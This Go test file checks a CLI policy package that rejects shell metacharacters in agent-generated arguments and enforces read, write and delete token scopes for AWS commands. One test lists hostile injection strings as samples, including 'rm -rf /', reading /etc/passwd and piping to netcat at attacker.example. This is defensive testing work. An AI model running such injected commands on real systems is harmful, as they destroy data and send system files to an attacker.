package policy_test

import (
	"errors"
	"testing"

	"github.com/coilysiren/coily/pkg/policy"
)

func TestValidateArg_AcceptsSafeStrings(t *testing.T) {
	cases := []string{
		"",
		"simple",
		"with-hyphens",
		"with.dots",
		"with/slashes",
		"with:colons",
		"Mixed_Case",
		"/path/to/thing.yaml",
		"arn:aws:iam::1234:user/kai-mac-laptop",
		"Z06714552N3MO04UBWF33",
		"https://github.com/coilysiren/coily",
		"/eco/server-api-token",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err != nil {
			t.Errorf("ValidateArg(%q) = %v, want nil", c, err)
		}
	}
}

func TestValidateArg_RejectsEveryShellMetacharacter(t *testing.T) {
	for _, r := range policy.ShellMeta {
		value := "ok" + string(r) + "bad"
		err := policy.ValidateArg("test", value)
		if err == nil {
			t.Errorf("ValidateArg(%q) = nil, want error (char %q)", value, r)
			continue
		}
		if !errors.Is(err, policy.ErrShellMeta) {
			t.Errorf("ValidateArg(%q): err = %v, want ErrShellMeta", value, err)
		}
	}
}

func TestValidateArg_RejectsInjectionAttempts(t *testing.T) {
	// Real-world shapes an agent might synthesize.
	cases := []string{
		"foo; rm -rf /",
		"foo && cat /etc/passwd",
		"foo | nc attacker.example 4444",
		"$(whoami)",
		"`whoami`",
		"foo > /tmp/out",
		"foo \n rm -rf /",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err == nil {
			t.Errorf("ValidateArg(%q) accepted injection attempt", c)
		}
	}
}

func TestValidateArgs_FirstViolationWins(t *testing.T) {
	args := map[string]string{
		"safe":   "ok",
		"unsafe": "foo;bar",
	}
	if err := policy.ValidateArgs(args); err == nil {
		t.Error("ValidateArgs accepted unsafe input")
	}
}

func TestValidateArgSlice_IncludesIndexInErrorMessage(t *testing.T) {
	err := policy.ValidateArgSlice("pos", []string{"ok", "bad;injection"})
	if err == nil {
		t.Fatal("expected error")
	}
	msg := err.Error()
	if want := "pos[1]"; !contains(msg, want) {
		t.Errorf("error = %q, want it to contain %q", msg, want)
	}
}

// fakeVerifier returns the configured scopes string on success, or err on
// failure. Used to drive Enforce through every branch.
type fakeVerifier struct {
	scopes string
	err    error
}

func (f fakeVerifier) VerifyScopes(_ string) (string, error) {
	return f.scopes, f.err
}

func TestEnforce_ReadOnlyAllowsMissingToken(t *testing.T) {
	inv := policy.Invocation{
		Verb: "aws.sts.get-caller-identity",
		Kind: policy.ReadOnly,
		Args: map[string]string{"--profile": "default"},
	}
	if err := policy.Enforce(inv, nil); err != nil {
		t.Errorf("Enforce readonly: %v", err)
	}
}

func TestEnforce_MutatingRejectsMissingToken(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Scope: "aws.route53:write",
		Args:  map[string]string{"--hosted-zone-id": "Z123"},
	}
	err := policy.Enforce(inv, fakeVerifier{scopes: "aws.route53:write"})
	if !errors.Is(err, policy.ErrTokenRequired) {
		t.Errorf("Enforce mutating without token: err = %v, want ErrTokenRequired", err)
	}
}

func TestEnforce_MutatingRejectsBadToken(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Scope: "aws.route53:write",
		Token: "garbage",
	}
	err := policy.Enforce(inv, fakeVerifier{err: errors.New("bad token")})
	if err == nil {
		t.Error("Enforce accepted bad token")
	}
}

func TestEnforce_MutatingAcceptsValidToken(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Scope: "aws.route53:write",
		Token: "valid",
		Args:  map[string]string{"--hosted-zone-id": "Z123"},
	}
	if err := policy.Enforce(inv, fakeVerifier{scopes: "aws.route53:write"}); err != nil {
		t.Errorf("Enforce with valid token: %v", err)
	}
}

func TestEnforce_MutatingNoVerifierIsError(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Scope: "aws.route53:write",
		Token: "something",
	}
	err := policy.Enforce(inv, nil)
	if !errors.Is(err, policy.ErrTokenRequired) {
		t.Errorf("Enforce with nil verifier: err = %v, want ErrTokenRequired", err)
	}
}

func TestEnforce_ArgsValidatedBeforeTokenCheck(t *testing.T) {
	// A mutating verb with both a missing token AND a bad arg should report
	// the bad arg first. This keeps error messages deterministic and keeps
	// the easier check from eclipsing the harder one.
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Scope: "aws.route53:write",
		Args:  map[string]string{"--zone": "Z123;rm"},
	}
	err := policy.Enforce(inv, nil)
	if !errors.Is(err, policy.ErrShellMeta) {
		t.Errorf("err = %v, want ErrShellMeta", err)
	}
}

// --- new bucket-aware tests ---

func TestEnforce_ReadScopeGrantsReadOnly(t *testing.T) {
	// list verb requires aws.route53:read. Token holds aws.route53:read.
	// (list is ReadOnly so this exercises Satisfies via auth, not Enforce
	// directly. Tested through Satisfies below.)
	if !policy.Satisfies("aws.route53:read", "aws.route53:read") {
		t.Error("aws.route53:read should satisfy itself")
	}
}

func TestEnforce_WriteScopeGrantsReadAndWrite(t *testing.T) {
	if !policy.Satisfies("aws.route53:write", "aws.route53:read") {
		t.Error("write should subsume read on the same service")
	}
	if !policy.Satisfies("aws.route53:write", "aws.route53:write") {
		t.Error("write should satisfy write")
	}
}

func TestEnforce_WriteScopeDoesNotGrantDelete(t *testing.T) {
	if policy.Satisfies("aws.route53:write", "aws.route53:delete") {
		t.Error("write must NOT subsume delete (kept separate)")
	}
}

func TestEnforce_DeleteScopeDoesNotGrantWriteOrRead(t *testing.T) {
	if policy.Satisfies("aws.route53:delete", "aws.route53:write") {
		t.Error("delete must NOT grant write")
	}
	if policy.Satisfies("aws.route53:delete", "aws.route53:read") {
		t.Error("delete must NOT grant read")
	}
}

func TestEnforce_TwoScopesGrantBoth(t *testing.T) {
	combined := "aws.route53:write,aws.route53:delete"
	for _, req := range []string{
		"aws.route53:read",
		"aws.route53:write",
		"aws.route53:delete",
	} {
		if !policy.Satisfies(combined, req) {
			t.Errorf("combined %q should satisfy %q", combined, req)
		}
	}
}

func TestEnforce_DifferentServiceDoesNotSatisfy(t *testing.T) {
	if policy.Satisfies("aws.s3:write", "aws.route53:write") {
		t.Error("s3 scope must not satisfy route53")
	}
}

func TestEnforce_RouteWriteTokenAllowsListVerbsAtPolicyLayer(t *testing.T) {
	// A token with aws.route53:write should be acceptable for an
	// invocation with required scope aws.route53:read. (Read verbs are
	// ReadOnly so they bypass the token check entirely, but if a verb is
	// ever upgraded to Mutating with a Read scope, the subsumption still
	// works.)
	inv := policy.Invocation{
		Verb:  "aws.route53.list-hosted-zones",
		Kind:  policy.Mutating, // hypothetical upgrade
		Scope: "aws.route53:read",
		Token: "valid",
	}
	if err := policy.Enforce(inv, fakeVerifier{scopes: "aws.route53:write"}); err != nil {
		t.Errorf("write token failed for read-scoped verb: %v", err)
	}
}

func TestEnforce_DeleteVerbRequiresDeleteScope(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.delete-hosted-zone",
		Kind:  policy.Mutating,
		Scope: "aws.route53:delete",
		Token: "valid",
	}
	// write scope alone fails.
	err := policy.Enforce(inv, fakeVerifier{scopes: "aws.route53:write"})
	if !errors.Is(err, policy.ErrTokenRequired) {
		t.Errorf("write scope on delete verb: err = %v, want ErrTokenRequired", err)
	}
	// delete scope succeeds.
	if err := policy.Enforce(inv, fakeVerifier{scopes: "aws.route53:delete"}); err != nil {
		t.Errorf("delete scope on delete verb: %v", err)
	}
}

func TestParseScope_AcceptsValid(t *testing.T) {
	cases := []string{
		"aws.route53:read",
		"aws.route53:write",
		"aws.route53:delete",
		"aws.s3:write",
		"gh.pr:write",
		"kubectl.rollout:write",
		"coily.eco:write",
	}
	for _, c := range cases {
		if _, err := policy.ParseScope(c); err != nil {
			t.Errorf("ParseScope(%q) err = %v, want nil", c, err)
		}
	}
}

func TestParseScope_RejectsInvalid(t *testing.T) {
	cases := []string{
		"",
		"aws",
		"aws.route53",
		"aws.route53:",
		"aws.route53:foo",
		"aws.route53.change-resource-record-sets", // old format
		"aws:write",
		"AWS.ROUTE53:WRITE",
		"aws.route53:write extra",
	}
	for _, c := range cases {
		if _, err := policy.ParseScope(c); err == nil {
			t.Errorf("ParseScope(%q) succeeded, want error", c)
		}
	}
}

func TestValidateScopeList(t *testing.T) {
	if err := policy.ValidateScopeList("aws.route53:write,aws.route53:delete"); err != nil {
		t.Errorf("err = %v, want nil", err)
	}
	if err := policy.ValidateScopeList("aws.route53:write, aws.route53:delete"); err != nil {
		// extra spaces should be tolerated
		t.Errorf("err = %v, want nil (spaces tolerated)", err)
	}
	if err := policy.ValidateScopeList(""); err == nil {
		t.Error("empty list should fail")
	}
	if err := policy.ValidateScopeList("aws.route53:write,bogus"); err == nil {
		t.Error("partial-bogus list should fail")
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
